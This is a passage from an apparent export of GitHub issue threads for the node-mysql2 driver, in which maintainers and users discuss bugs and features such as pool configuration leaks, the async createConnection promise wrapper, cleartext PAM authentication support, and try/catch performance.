    <Body>This addresses an exception that occurs when using namedParameters if the named param is missing from the values object. The code hits `this.parameters[i].toString()` and throws up because `this.parameters[i]` is undefined.&#13;
&#13;
Sorry I don't have a test for it, I fixed it directly in my installed dependency. Prior to the change I couldn't even tell what query was causing the error. After the change I get a proper ER_WRONG_ARGUMENTS error out of the query and was able to trace it back to the offending code.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks! I'll need to fix travis setup first ( I think docker-based mysql started to conflict with default ) before merging this, hope to do that over weekend</Body>
    </Comment>
    <Comment>
      <Owner>vlasky</Owner>
      <Body>Hi @sidorares, I'd be grateful if you could merge this fix. I and my colleagues often struggle to identify such problem queries.</Body>
    </Comment>
    <Comment>
      <Owner>sushantdhiman</Owner>
      <Body>@vlasky can you resubmit this PR, its still using old travis setup which fails.</Body>
    </Comment>
    <Comment>
      <Owner>sushantdhiman</Owner>
      <Body>Need to consider discussion https://github.com/sidorares/node-mysql2/issues/493 as well when working on fix</Body>
    </Comment>
    <Comment>
      <Owner>swftvsn</Owner>
      <Body>Could we atleast what I propose in #687? This would allow to turn the logging on and see where the mismatch is.</Body>
    </Comment>
  </Issue_514>
  <Issue_515>
    <Repository>node-mysql2</Repository>
    <Title>changeUser affects pool configuration!!!</Title>
    <Owner>sidorares</Owner>
    <Body>Hi there,&#13;
&#13;
this is annoying me in  mysql2@1.1.2:&#13;
&#13;
Changing the user of a pooled connection will also set user for all connections acquired from the pool in the future.&#13;
&#13;
&#13;
    var pool=require('mysql2').createPool({&#13;
      connectionLimit : 5, &#13;
      host            : 'localhost',&#13;
      user            : 'root',&#13;
      //password      : ... &#13;
      database       : 'mysql',&#13;
      multipleStatements: true&#13;
    });&#13;
    &#13;
    // get pool connection:&#13;
    pool.getConnection((err,con) =&gt; {&#13;
      if(err) return console.log(err);&#13;
      con.query('select user();', (err, res) =&gt; {&#13;
        if(err) return console.log(err);&#13;
        console.log(res); // --&gt; root@localhost&#13;
    &#13;
        // change connection user:&#13;
        con.changeUser({&#13;
          user: 'test',&#13;
          password: 'test'&#13;
        }, err =&gt; {&#13;
          if(err) return console.log(err);&#13;
    &#13;
          con.query('select user();', (err, res) =&gt; {&#13;
            if(err) return console.log(err);&#13;
            console.log(res); // --&gt; test@localhost&#13;
    &#13;
            // destroy connection&#13;
            con.destroy();&#13;
    &#13;
            // get a fresh connection&#13;
            pool.getConnection((err,con) =&gt; {&#13;
              if(err) return console.log(err);&#13;
              con.query('select user();', (err, res) =&gt; {&#13;
                if(err) return console.log(err);&#13;
                console.log(res); // --&gt; STILL test@localhos !!!!&#13;
                pool.getConnection((err,con) =&gt; {&#13;
                  if(err) return console.log(err);&#13;
    &#13;
                  // get a second connection, maybe destroy didn't work...?&#13;
                  con.query('select user();', (err, res) =&gt; {&#13;
                    if(err) return console.log(err);&#13;
                    console.log(res); // --&gt; test@localhost !!!!!!!&#13;
                  });&#13;
                });&#13;
              });&#13;
            });&#13;
    &#13;
          });&#13;
        });&#13;
      });&#13;
    });&#13;
&#13;
&#13;
Take care&#13;
&#13;
M&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>atomfried</Owner>
      <Body>Works fine in node-mysql.</Body>
    </Comment>
    <Comment>
      <Owner>ifsnow</Owner>
      <Body>@atomfried I'm working to make it do like `node-mysql`. then, it will be better than now. Please wait a minute.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I think pool need to create a copy of config when new connection is created so when connection changes it pool config remains intact.&#13;
&#13;
At https://github.com/sidorares/node-mysql2/blob/d8e3b05bbeca8b1b87428600071b82e9cbbb6b90/lib/pool.js#L41&#13;
&#13;
Something like this:&#13;
&#13;
```js&#13;
connection = new PoolConnection(this, {config: Object.assign({}, this.config.connectionConfig)});&#13;
```&#13;
&#13;
@ifsnow do you have ETA for your work? Let me know if you need any help</Body>
    </Comment>
    <Comment>
      <Owner>ifsnow</Owner>
      <Body>@sidorares I'm done applying the improved pool([link](https://github.com/mysqljs/mysql/pull/1591)). I'm trying to add test cases. I think I'll need another day or two.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks @ifsnow for update!</Body>
    </Comment>
    <Comment>
      <Owner>ifsnow</Owner>
      <Body>@sidorares I'm discussing about keeping Pool's internal private properties. ([mysqljs's PR](https://github.com/mysqljs/mysql/pull/1591)) Do you have a similar opinion? If so, I'd better stop this.</Body>
    </Comment>
  </Issue_515>
  <Issue_516>
    <Repository>node-mysql2</Repository>
    <Title>Promise wrapper on createConnection is problematic in top-level code</Title>
    <Owner>sidorares</Owner>
    <Body>The non-promise version of createConnection is not asynchronous. Unlike the database calls, no callback is required here.&#13;
&#13;
```&#13;
var connection = mysql.createConnection({host:'localhost', user: 'root', database: 'test'});&#13;
```&#13;
&#13;
However, the promise wrapper version comes back as a promise.&#13;
&#13;
```&#13;
let connection = await mysql.createConnection({host:'localhost', user: 'root', database: 'test'});&#13;
```&#13;
&#13;
This wouldn't be a problem, except that Node/V8 don't currently allow await outside of an async function, including at the top level of an app. This means that the example code doesn't work when you drop it into a simple Node app. The easy solution that I've come up for this, is to wrap createConnection in an IIFE.&#13;
&#13;
```&#13;
let connection&#13;
&#13;
(async function() {&#13;
  try {&#13;
    connection = await mysql.createConnection(dbconfig)&#13;
  } catch(err){&#13;
    console.error(err)&#13;
  }&#13;
})()&#13;
```&#13;
&#13;
This seems unnecessarily complex, since this isn't a method that needs to be async. I would propose that createConnection remains a synchronous function, the same way it is in the non-promise version. I'm also having difficulty finding an easy way to stick my DB stuff into a module with this pattern.</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi @jdhiro 

I see your point, I wish 7+ node had repl and top level module wrapper async functions

Here are my thoughts: the only correct way of using connection, even in simple script is like this:

``` js
   const conn = mysql.createConnection(opts);
   conn.on('error', (err) =&gt; { /* 
      handle non-query errors: connection time, network etc
      connection time errors usually can be handled without 
      dedicated conn.on('error') handler because usually there 
      is a command in the queue and fatal errors are reported 
      down to all commands. However, when there is no 
      command in the queue, or command with no callback
      and there is connection error, error must be handled by
      conn error handler, otherwise it'll be re-thrown and 
      crash process
     */ })
    conn.query('do some sql', (err, res) =&gt; {
      if (err) {
         return err;
      }
    })
```

async `.createConnection()` helps a little with this, in a way that if there is connection error and no command error can be caught. Unfortunately it's still possible for 'error' connection event to crash process so you must attach listener. My advise is to always use pool, even in scripts - pool handles this error logic automatically.

I'll think about changing `.createConnection()` to be sync. Maybe it's possible to make this backwards compatible

as a work around - if you prefer async wrappers but want to have `.createConnection()` in top lewel of script without extra wrapping - just don't use await:

``` js
const myAsyncFunc = async (conn, x) =&gt;  {
   const [rows, fields] = conn.query('select 1+?', x)
   console.log(rows);
}

const mysql = require('mysql2/promise');
mysql.createConnection({}).then( (conn) =&gt; {
   myAsyncFunc(conn, 1);
   myAsyncFunc(conn, 2);
}).catch((e) =&gt; {
  console.log('error!!!', e);
})
```
</Body>
    </Comment>
    <Comment>
      <Owner>kswope</Owner>
      <Body>This is a show stopper for me.  I'm not sure why createConnection had to be async, it doesn't make any sense.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@kswope can you use `createPool` instead? It's sync&#13;
&#13;
The reason `createConnection` is async is to allow you to catch connection time runtime errors:&#13;
&#13;
```js&#13;
   let conn;&#13;
   try {&#13;
      const credentials = await getCredentials();&#13;
      conn = await mysql.createConnection(credentials)&#13;
   } catch(e) {&#13;
      // fallback or cleanup &#13;
   }&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>kswope</Owner>
      <Body>&gt; The reason createConnection is async is to allow you to catch connection time runtime errors:&#13;
&#13;
You can still get catch connection time runtime errors with a sync method as well, I don't see your point.&#13;
&#13;
knex has no problem doing this (even using this module), and I could promisify the other mysql drivers query method and get the same thing.&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>kswope</Owner>
      <Body>Ok I see, you want to handle the situation where the connection is dependent on previous network call.  Don't think I've ever seen that before, must be a rare situation.  Maybe a createConnectionSync would be a solution.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>currently connection object tries to perform network connection and handshake immediately. For a sync `createConnection()` you would have to handle error on connection object&#13;
&#13;
```js&#13;
   const conn = mysql.createConnectionSync (params);&#13;
   conn.on('error', err =&gt; {&#13;
     // handle network or handshake errors here&#13;
     // network: host/port not reachable&#13;
     // Handshake: incorrect password, incorrect access (ip, table restrictions etc), too many users&#13;
   })&#13;
   const data = await getData();&#13;
   const result = conn.execute('select foo from bar where id = ?', [data.id]);&#13;
``` &#13;
   &#13;
Is there any reason `createPool` won't work for you where you'd use `createConnectionSync` ?</Body>
    </Comment>
    <Comment>
      <Owner>kswope</Owner>
      <Body>Ok I'm just being dumb.  I assumed createConnection was for pooling (maybe because I'm also using knex and it makes pools be default), and there's no mention of pooling in the docs ( I know its covered by the other mysql module ), and then I assumed that createPool didn't work with 'mysql2/promise' because the example doesn't cover it.</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Yeah, maybe it should have been default to create pool. Currently createConnection creates single connection. I always recommend pool even if it's not required for performance reason, because pool adds useful error logic</Body>
    </Comment>
    <Comment>
      <Owner>kswope</Owner>
      <Body>If you are trying to stick with the behavior of mysqljs/mysql then you've made the right choice in my opinion.&#13;
&#13;
&gt;  MySQL2 team is working together with mysqljs/mysql team to factor out shared code and move it under mysqljs organisation.&#13;
&#13;
Is that still happening?</Body>
    </Comment>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>Yea, in fact was just pulling out the AWS certs to share right now :waves:</Body>
    </Comment>
  </Issue_516>
  <Issue_517>
    <Repository>node-mysql2</Repository>
    <Title>It fails connection when server uses PAM</Title>
    <Owner>sidorares</Owner>
    <Body>When I try to connect as a user the server expects to authenticate via the [PAM Authentication Plugin](http://dev.mysql.com/doc/refman/5.5/en/pam-authentication-plugin.html), the following error is thrown

```
Error: Client does not support authentication protocol requested by server;
       consider upgrading MariaDB client
```

After reading your node-mysql2 docs, and some investigations, I finally realized there's no support for [mysql_clear_password](http://dev.mysql.com/doc/refman/5.7/en/cleartext-authentication-plugin.html) capabilities yet. I realized you provided an `authSwitchHandler` configuration setting to properly react when the server asks for specific authentication methods.

Couldn't it be useful providing `mysql_clear_password` the same way `mysql_native_password` authentication capabilities have been already provided internally? After reading the official MySQL [Clear Text Authentication](https://dev.mysql.com/doc/internals/en/clear-text-authentication.html) piece of documentation, we could easily implement it in Javascript.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'm a bit on the fence about if we should have clear text authentication bundled in core, as I'd like to discourage it's use. Maybe we should add it as example using initial handshake with mysql_clear_password plugin auth (not possible yet but should be there soon) or as authSwitch handler ( possible right now, I reckon handler function would be less than ~20 lines of js )

Implementation of clear text auth in mysqljs/mysql: https://github.com/mysqljs/mysql/blob/a0f2cec26ee86536dbc1c2837b92b191ca9618f1/lib/protocol/Auth.js#L88-L106 and https://github.com/mysqljs/mysql/blob/c226ee74a14d99a1bf9a3d7a9606c34ffff533e4/lib/protocol/sequences/Handshake.js#L77
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Couldn't it be useful providing mysql_clear_password the same way mysql_native_password authentication capabilities have been already provided internally? 

yes, this is another option, might go this route
</Body>
    </Comment>
    <Comment>
      <Owner>angiolep</Owner>
      <Body>Despite it seems an unsafe way to send passwords over the network, `mysql_clear_password` is just one of the MySQL Authentication Methods specified in 

https://dev.mysql.com/doc/internals/en/authentication-method.html

and requested in 

http://dev.mysql.com/worklog/task/?id=1054

The simplest piece of Javascript I had to write to make **mysqlj** support it:

``` javascript
dbConf.authSwitchHandler = (data, cb) =&gt; {
    if (data.pluginName === 'mysql_clear_password') {
      // https://dev.mysql.com/doc/internals/en/clear-text-authentication.html
      var password = dbConf.password + '\0';
      var buffer = Buffer.from(password);
      cb(null, buffer);
    }
  };
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>What about this: add support for [cleartext auth](https://dev.mysql.com/doc/internals/en/clear-text-authentication.html) and ["old auth"](https://dev.mysql.com/doc/internals/en/old-password-authentication.html) but by default only allow to use them when connecting over unix socket or to localhost or over ssl
</Body>
    </Comment>
    <Comment>
      <Owner>angiolep</Owner>
      <Body>It seems you're too much concerned of addressing possible MySQL authentication method's vulnerabilities (particularly those you believe could arise from cleartext_authentication)

Shouldn't those vulnerability concerns be addressed by MySQL designers themselves rather than by this `node-mysql2`  driver? Official MySQL documentation is just listing all the authentication methods a fully-compliant driver-client should be able to support

https://dev.mysql.com/doc/internals/en/authentication-method.html

As many other MySQL drivers do (for other programming languages such as Java, Python, Ruby etc.) shouldn't this `node-mysql2` driver for Javascript just support all of the above authentication methods despite their possible vulnerabilities?

Why shall this `node-mysql2` deny some authentication methods (though they must be provided) if some conditions are not met (such as denying cleartext_authentication if no SSL/TLS is involved) ? The official MySQL documentation doesn't state that.

You're probably not considering that in certain private networks (such as those for big private corporations) password are simply transmitted clear_text because there are Kerberos Distribution Centers in place to provide security. That's one of the reasons MySQL designers have been running the following task

http://dev.mysql.com/worklog/task/?id=1054

and I suppose there are many other reasons the most recent MySQL servers delegate authentication to an external PAM - Pluggagle Authentication Module. That's why this `node-mysql2` should send password in clear text when asked by the server side.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; That's why this node-mysql2 should send password in clear text when asked by the server side.

I agree with most of what you say, but I think at API level it should be very clear when credentials are sent securely and when not. Yes, there might be a lot of scenarios when this is not important ( local db, connecting over ssh tunnel etc ). mysqljs/mysql currently only support `mysql_native_password` and `mysql_old_password` and `insecureAuth` flag is required for latter to be used. We probably should be consistent with that. 

@dougwilson Do you have an opinion on this ?
</Body>
    </Comment>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>I have been silently following this conversation and don't have any strong opinions on it, but I do agree generally that it should be opt-in only. Even MySQL's own documentation shows they also make it opt-in only for their own clients (http://dev.mysql.com/doc/refman/5.7/en/cleartext-authentication-plugin.html).
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@angiolep I'm happy to bundle `mysql_clear_password` and `mysql_old_auth` AuthSwitch handlers and have them called automatically when server request this type of auth, but only if the client explicitly turned on `insecureAuth` switch. It's not super high priority for me right now - feel free to send PR if you want this to be implemented faster
</Body>
    </Comment>
    <Comment>
      <Owner>nathanewakefield</Owner>
      <Body>Not sure if this is where I should ask... but does anyone have steps for implementing a solution to the original error?</Body>
    </Comment>
    <Comment>
      <Owner>elephantjim</Owner>
      <Body>FWIW, `mysql_clear_password` is needed to be able to connect to an Aurora database on AWS RDS when using IAM auth tokens.  The connection to the RDS instance is over SSL, and the authentication token is sent in the clear (because it's already an HMAC signature).&#13;
&#13;
@angiolep 's fix in https://github.com/sidorares/node-mysql2/issues/438#issuecomment-255343793 worked for me.  Thanks!</Body>
    </Comment>
    <Comment>
      <Owner>kennu</Owner>
      <Body>I also ran into this problem when trying to connect Sequelize to AWS RDS Aurora using IAM authentication tokens. Too bad the mysql2 driver does not work out of the box. Had to spend time looking how to implement a workaround for Sequelize. I was able to pass the previously given fix like this in the Sequelize constructor options:&#13;
&#13;
    dialectOptions: {&#13;
      authSwitchHandler: authSwitchHandler,&#13;
      ssl: 'Amazon RDS',&#13;
    },</Body>
    </Comment>
  </Issue_517>
  <Issue_518>
    <Repository>node-mysql2</Repository>
    <Title>Added test to trigger value out of bounds bug</Title>
    <Owner>sidorares</Owner>
    <Body>Referenced to #248 - More commits to come
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@lillem4n unfortunately try/catch are expensive and often cause v8 to deoptimize functions. As a workaround for your particular case we could add check to packet length and if &gt; 16M propagate error to callback, until big packet support is landed
</Body>
    </Comment>
    <Comment>
      <Owner>lillem4n</Owner>
      <Body>As long as the library does not throw errors on async calls, I'm perfectly happy. :)

I'm not good enough with this library to make a good enough solution that returns an error, since I do not fully understand the consequences of fiddling with the inside of this.next().

I might dive deeper, but not today.

Hope this helped with showing a bit on what I need on the "client" side.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@lillem4n thanks a lot for your input, I do share the same - async system library under no circumstance can throw error in a way client is unable to catch. I'll try to evaluate other approaches, maybe try/catch is indeed the only safe solution, even at performance cost
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@lillem4n updates:
1) main issue should be fixed by #421 , we will try to land it first
2) I'll do benchmarking with try/catch at top level of sync code paths. Based on performance cost we might add (or not) them

I'll keep this PR open as placeholder for "how to avoid crashes that are not possible to handle in user code" discussion, but pr itself is unlikely to be merged as is (your test though went to #421)
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>try/catch performance research:

while V8 with torbofan does some optimisations for try/catch ( http://v8project.blogspot.com.au/2015/07/v8-45-release.html ) on my simple tests there was significant (up to 10x) penalty for a function with try/catch block, even when try catch is around loop (not inside loop / hot path). Also see  https://github.com/petkaantonov/bluebird/wiki/Optimization-killers#2-unsupported-syntax

I did very simple benchmark ( 100k rows from real production data copy - 51 field in a row) and it seems that in practice it's not that bad, ~3% decrease while having 5% std deviation (so it's less than statistical error)

current mysql2:
Milliseconds:  2091 rows per sec: 47824.007651841224  fields per sec: 2439024.3902439023
Average fields per sec over ~30 runs, standard deviation: 2464686,  113277

mysql2 + try/catch around packetParser.execute() only
Milliseconds:  1967 rows per sec: 50838.84087442806  fields per sec: 2592780.8845958314
Average fields per sec over ~30 runs,  standard deviation: 2545764 102012

mysql:
Milliseconds:  7957 rows per sec: 12567.550584391101  fields per sec: 640945.0798039462
Average fields per sec over ~30 runs,  standard deviation: 667522 191383

mysql is 3.8 times slower at 100k rows, crashing with memory error at 150k ( mysql2 doing fine with full results, 449800 rows)

obviously this is some extreme test where mysql2 is doing especially well ( very large result set ). When you query 1-5 rows at a time perf difference is not so huge
</Body>
    </Comment>
    <Comment>
      <Owner>lillem4n</Owner>
      <Body>@sidorares Thats great! Does that mean try/catch is actually an option after all?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Does that mean try/catch is actually an option after all?

probably yes. Note that wrapping `packetParser.execute()` should be enough as it does result callback synchronously (which in turn makes all protocol parsing code up to query/execute callback). Exception in packets or commands (as in `/lib/packets/*`, `/lib/commands/*` ) would be caught by this try/catch (unless compression is used, because compression leaves execution flow to event loop [here](https://github.com/sidorares/node-mysql2/blob/f88eb6e8aa33e9f9703396f0de6ee06c9b4d5a4b/lib/compressed_protocol.js#L39-L43)
</Body>
    </Comment>
  </Issue_518>
  <Issue_519>
    <Repository>node-mysql2</Repository>
    <Title>SIGABRT when child-process crashed and restart</Title>
    <Owner>sidorares</Owner>
    <Body>As in title, it happens only after process working for some long time, then you kill it and it can't wake up again because of constantly SIGABRT.

`was killed by signal: SIGABRT`

node v4.4.7, FreeBSD
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>I'm afraid there is not enough details for me here. How much memory you have on server? How much node process is using after some long time?
</Body>
    </Comment>
    <Comment>
      <Owner>Kamil93</Owner>
      <Body>Have some new data (this happens on node 6.3.1):

 1: node::Abort(void) [/usr/local/devil/node6/bin/node]
 2: node::PlatformInit(void) [/usr/local/devil/node6/bin/node]
 3: node::Start(int, char**) [/usr/local/devil/node6/bin/node]
 4: _start [/usr/local/devil/node6/bin/node]
was killed by signal: SIGABRT

and again and again forever (I spawn child after 5 secs when it quit by error or not)

@sidorares: just one day or less, I haven't measured it better.

Everything was working fine on node v0.8.25, when I changed node to v4/v6 I changed only module db-mysql to mysql2 instead. So error is from node or node-mysql2 (with pooling used)

I have around 4GB RAM.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>Is that 4GB free RAM? Can you check oom killer log?
</Body>
    </Comment>
    <Comment>
      <Owner>Kamil93</Owner>
      <Body>Total 4GB, usage always around 1.4GB (like for now)
I'm on shared hosting and don't have permission to this log... unfortunatelly.
About 2 weeks and I will have some time to do some additional tests for additional data.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can only suggest to try with https://github.com/mysqljs/mysql and compare behaviour
Might be a lot of different things - FreeBSD -related V8 or libuv bug, memory or interference with some other processes. Unfortunately don't have FreeBSD experience myself
</Body>
    </Comment>
  </Issue_519>
  <Issue_520>
    <Repository>node-mysql2</Repository>
    <Title>notify all commands in the queue when connection is forcibly closed</Title>
    <Owner>sidorares</Owner>
    <Body>I think [here](https://github.com/sidorares/node-mysql2/blob/b2010f99180d8b49eb7e9c2b6aeb8cb441362835/lib/pool_connection.js#L17-L21)

We need to iterate connection queue first and call callback with error ( using `Connection.prototype._notifyError` )
</Body>
    <State>open</State>
    <Comment>
      <Owner>lillem4n</Owner>
      <Body>Maybe related, I am researching a way to gracefully handle connection lost events in my application:

stack=[
    Error: Connection lost: The server closed the connection.,
        at Socket.&lt;anonymous&gt; (/foo/bar/node_modules/larvitdbmigration/node_modules/mysql2/lib/connection.js:96:35),
        at emitNone (events.js:72:20),  
        at Socket.emit (events.js:166:7),  
        at endReadableNT (_stream_readable.js:913:12),  
        at nextTickCallbackWith2Args (node.js:442:9),  
        at process._tickDomainCallback (node.js:397:17)
]

Right now I'll have to wrap the whole mysql2 business in a try/catch and that does not feel good. I still have to come up with a good automated test to trigger this.
</Body>
    </Comment>
  </Issue_520>
  <Issue_521>
    <Repository>node-mysql2</Repository>
    <Title>auth with client credentials</Title>
    <Owner>sidorares</Owner>
    <Body>I think there should be a possibility to: not provide username &amp; password in config.js and instead require the user to provide user &amp; pw when connecting to the node-server (which will then be used for executing queries on the mysql-server)
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>you mean ask at handshake time? How it is better compared to 1) ask user for credentials 2) create connection?
</Body>
    </Comment>
    <Comment>
      <Owner>christw92</Owner>
      <Body>Yes I mean at handshake time (that word did not come to my mind when I opened the issue).
I don't think one option is better than the other one. I think it would be great if both 1) and 2) would be supported. It depends on the use case.

e.g.: I'm thinking about implementing a "mysql-proxy" that automatically checks sql-statements for its content (it checks what data is going to be modified) and performs actions depending on this information.
I don't want to go too much into detail but one use case could be to e.g. auto-send an e-mail if specific data gets modified.

For this kind of things it would be great to ask at handshake time because in this case there is no other point of time when the user/database-application can be asked for credentials
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>It'll be possible when custom connection time AuthPlugin is added - see https://github.com/sidorares/node-mysql2#authentication-switch-request

On the server there is `authCallback` parameter  https://github.com/sidorares/node-mysql2/blob/aff0b1c8eca5c63566786c72d645224d5a914170/lib/commands/server_handshake.js#L44
</Body>
    </Comment>
  </Issue_521>
  <Issue_522>
    <Repository>node-mysql2</Repository>
    <Title>[Need help]Streamming rows problem</Title>
    <Owner>sidorares</Owner>
    <Body>I'm using a pool, get one connection to fetch rows, use another one to update rows back to mysql.
When the dataset is very small, like 100 rows, it works. But when it's little bigger, it stuck, the updateRow seems never invoked.any one could help?

``` javascript
pool.getConnection(function (err, conn) {
    conn.query("SELECT * FROM table")
            .on('result', function (row) {
                conn.pause()
                updateRow(row, function(){conn.resume()}) //update it back
            })
})
function updateRow(row, resume) {
    pool.getConnection(function (err, conn) {
        conn.query('UPDATE table SET ....', function(err, result) {
            resume()
        })
    })   
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>dougwilson</Owner>
      <Body>If you pasted the full code, then you are missing the `conn.release()` call in your `updateRow`, which would cause the pool to get exhausted. Add `conn.release()` right before `resume()`.
</Body>
    </Comment>
    <Comment>
      <Owner>dsonet</Owner>
      <Body>@dougwilson Thanks for your reply. I released connection in updateRow. Finally I figure it out. The problem here is caused by the MyISAM engine. It use table block. Since I opreation the same table.
</Body>
    </Comment>
    <Comment>
      <Owner>dsonet</Owner>
      <Body>But still strange is that I tried replace the updateRow simple as 

``` javascript
function updateRow(row, resume) {
    setTimeout(resume, 100)
}
```

It's seems never reach the 'end' events. usually lasts about 6 minutes then just stuck.
</Body>
    </Comment>
    <Comment>
      <Owner>tienvx</Owner>
      <Body>If you want to see the real error:

```
var connection = mysql.createConnection(config.db);
connection
    .query(sql)
    .on('result', callback);
```

In my case, the error is:
`Error: Connection lost: The server closed the connection.`
Maybe
`SELECT * FROM table`
is too big for mysql for streaming, I changed to
`SELECT id FROM table`
and the error gone.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@tienvx how big is result in your case ( number of rows and columns?) can you post a schema so I can try to replicate?
</Body>
    </Comment>
    <Comment>
      <Owner>tienvx</Owner>
      <Body>Hey @sidorares , sorry the schema is private so I can not post it.

The table have 110k rows, 17 columns (including 1 longtext column). Also in my case, the code is

```
pool.getConnection(function (err, conn) {
    conn.query("SELECT id, a, b, c, d, e, f FROM table")
            .on('result', function (row) {
                conn.pause()
                pushRowToRabbitmq(function () {
                      conn.resume();
                });
            })
})
```

Not the same with @dsonet .Hope it help.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>ok I'll just try to test it on a some 17x110k table and get back for more help if unable to reproduce

Do you get any errors if you do non-streaming version?

``` js
var connection = mysql.createConnection(config.db);
connection.query(sql, callback);
```
</Body>
    </Comment>
    <Comment>
      <Owner>tienvx</Owner>
      <Body>There are no errors with non-streaming version.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can't reproduce. What's in your callback? Is it heavy? It's supposet to be executed 100k times
</Body>
    </Comment>
  </Issue_522>
  <Issue_523>
    <Repository>node-mysql2</Repository>
    <Title>Unit tests for Pools?</Title>
    <Owner>sidorares</Owner>
    <Body>I've got a PR to add a `connectionExpiry` option to Pools that automatically terminates a connection after a set number of milliseconds.  I went to write tests for it and realized that there aren't any tests at all for the pools.

Would it be worthwhile for me to try to port over the pool and pool cluster tests from node-mysql and update them for mysql2's changes?
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>&gt; Would it be worthwhile for me to try to port over the pool and pool cluster tests from node-mysql and update them for mysql2's changes?

yes, that would be super useful
</Body>
    </Comment>
  </Issue_523>
  <Issue_524>
    <Repository>node-mysql2</Repository>
    <Title>compability with integer, biginteger, double, decimal</Title>
    <Owner>sidorares</Owner>
    <Body>returned from the query always `string` value, the problem is when we use the value in `Numeric`,
my problem seems like this issue https://github.com/sidorares/node-mysql2/issues/237
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@sonsonz could you elaborate a bit more on what &amp; why is in this PR?
</Body>
    </Comment>
  </Issue_524>
  <Issue_525>
    <Repository>node-mysql2</Repository>
    <Title>too many connections using pool</Title>
    <Owner>sidorares</Owner>
    <Body>Hi there,

I'm using pool connections of 100 connections.
Once in awhile I'm getting the following error:

doSql pool.getConnection failed with error:Error: Host 'xxxxx' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'

Any idea on how to fix this?

Best,
Guy
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hi @guypaskar , could you try my suggestion from #270 ? 
</Body>
    </Comment>
    <Comment>
      <Owner>guypaskar</Owner>
      <Body>I'm not sure I understand what the issue there and what was the suggestion. Let me add a code snippet of how I use.

``` js
pool.getConnection(function(err, connection) {
            // Use the connection
            if(err){
                console.log('doSql pool.getConnection failed with error:' +err);
            }else{
                if(connection &amp;&amp; 'query' in connection){
                    connection.query(stmt, function(err, rows) {
                        // And done with the connection.
                        if (err != null) {
                            console.log(err);
                        }
                        connection.release();
                        // The connection is terminated now
                        callback(rows, err);


                        // Don't use the connection here, it has been returned to the pool.
                    });
                }
            }


        }); 
```
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>hm, #270 is about `Pool.query()` shortcut, looks like your issue is different as you are using `getConnection() + connection.queue()`
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>@guypaskar looks like this it not directly related to pool, see for example http://stackoverflow.com/questions/2395654/mysql-phpmyadmin-many-connection-errors

Do you see this error for all connections or you are able to connect initially?
</Body>
    </Comment>
    <Comment>
      <Owner>guypaskar</Owner>
      <Body>Yeah I know this issue.
I thought it might be related to the pool. I'm not sure that is the case yet.
Maybe the pool it creating the "interrupted connect requests" somehow.
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>can you post debug log here ( create pool with `debug` option set to true ) ?
</Body>
    </Comment>
    <Comment>
      <Owner>guypaskar</Owner>
      <Body>Sure. But I have to wait until the issue happens again no and only then send the log. No?
</Body>
    </Comment>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>yes, I need to see log around connection time.
</Body>
    </Comment>
    <Comment>
      <Owner>guypaskar</Owner>
      <Body>Ok. I will try to catch it and report back.
</Body>
    </Comment>
  </Issue_525>
  <Issue_526>
    <Repository>node-mysql2</Repository>
    <Title>1.0.0-rc.1 connection pool get exhausted using pool's query method</Title>
    <Owner>sidorares</Owner>
    <Body>I know this is bad bug report, since I am currently not able to provide reproducible test, but anyway:
- On 1.0.0-rc.1, using `Pool.query` method, you eat all connections and they are not released to pool ([callback is never invoked](https://github.com/sidorares/node-mysql2/blob/master/lib/pool.js#L134) and connection is not released)
- On 0.15.8, `Pool.query` works just fine, pool is not getting exhausted
- On 1.0.0-rc.1, `Pool.execute` works properly, connections are successfully returning to pool

Node v5.6.0. I'll try to prepare working example for debugging, but I am in a bit of a rush here, so I don't know exactly when.
</Body>
    <State>open</State>
    <Comment>
      <Owner>sidorares</Owner>
      <Body>thanks for report @dolphin278 !

